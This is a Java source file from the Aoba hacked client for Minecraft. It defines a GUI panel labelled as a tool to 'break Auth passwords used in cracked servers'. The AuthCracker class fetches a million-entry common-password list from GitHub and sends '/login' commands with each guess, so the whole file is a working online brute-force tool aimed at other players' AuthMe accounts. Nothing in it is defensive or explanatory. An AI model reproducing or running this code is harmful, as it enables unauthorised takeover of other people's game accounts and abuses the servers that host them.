/*
* Aoba Hacked Client
* Copyright (C) 2019-2024 coltonk9043
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

package net.aoba.gui.tabs;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

import net.aoba.gui.tabs.components.ButtonComponent;
import net.aoba.gui.tabs.components.SliderComponent;
import net.aoba.gui.tabs.components.StackPanelComponent;
import net.aoba.gui.tabs.components.StringComponent;
import net.aoba.settings.types.FloatSetting;
import net.minecraft.client.MinecraftClient;

public class AuthCrackerTab extends ClickGuiTab {
	private ButtonComponent start;

	private FloatSetting delay = new FloatSetting("authcracker_delay", "Delay", 100, 50, 50000, 1, null);

	private AuthCracker authCracker;
	
	Runnable startRunnable;
	Runnable endRunnable;
	
	public AuthCrackerTab(String title, int x, int y){
		super(title, x, y, false);
		this.width = 360.0f;
		
		StackPanelComponent stackPanel = new StackPanelComponent(this);
		stackPanel.setTop(30);
		
		StringComponent label = new StringComponent("This panel can be used to break Auth passwords used in cracked servers.", stackPanel);
		stackPanel.addChild(label);
		
		SliderComponent slider = new SliderComponent(stackPanel, delay);
		stackPanel.addChild(slider);

		authCracker = new AuthCracker(delay);
		
		this.startRunnable = new Runnable() {
			@Override
		    public void run() {
				authCracker.Start();
				start.setText("Cancel");
				start.setOnClick(endRunnable);
		    }
		};
		
		this.endRunnable = new Runnable() {
			@Override
			public void run() {
				authCracker.Stop();
				start.setText("Start");
				start.setOnClick(startRunnable);
			}
		};
		
		start = new ButtonComponent(stackPanel, "Start", startRunnable);
		stackPanel.addChild(start);
		
		this.children.add(stackPanel);
	}
}

class AuthCracker{

	private Thread curThread;
	private boolean shouldContinue = true;
	private MinecraftClient mc = MinecraftClient.getInstance();
	private FloatSetting delay;
	
	public AuthCracker(FloatSetting delay) {
		this.delay = delay;
	}
	
	private long time = System.currentTimeMillis();
	
	private void RunAuthCracker() {
		System.out.println("Aoba AuthMe Cracker Started.");
		URL url;
		Scanner s = null;
		try {
			URI uri = new URI("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt");
			url = uri.toURL();
			s = new Scanner(url.openStream());
		} catch (IOException e) {
			e.printStackTrace();
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
		if(s != null) {
			while(shouldContinue && s.hasNextLine()) {
				if(System.currentTimeMillis() - time > delay.getValue().floatValue()) {
					String str = s.nextLine();
					while(mc.player == null) {
						try {
							TimeUnit.SECONDS.sleep(1);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
					if(mc.player.networkHandler != null) {
						mc.player.networkHandler.sendChatCommand("login " + str);
						time = System.currentTimeMillis();
					}else {
						System.out.println("Network Handler is null");
					}
				}
			}
		}
		
		System.out.println("Aoba AuthMe Cracker Stopped.");
	}
	
	public void Start() {
		curThread = new Thread(new Runnable() {
		    @Override
		    public void run() {
		    	RunAuthCracker();
		    }
		});  
		curThread.start();
	}
	
	public void Stop() {
		this.shouldContinue = false;
	}
}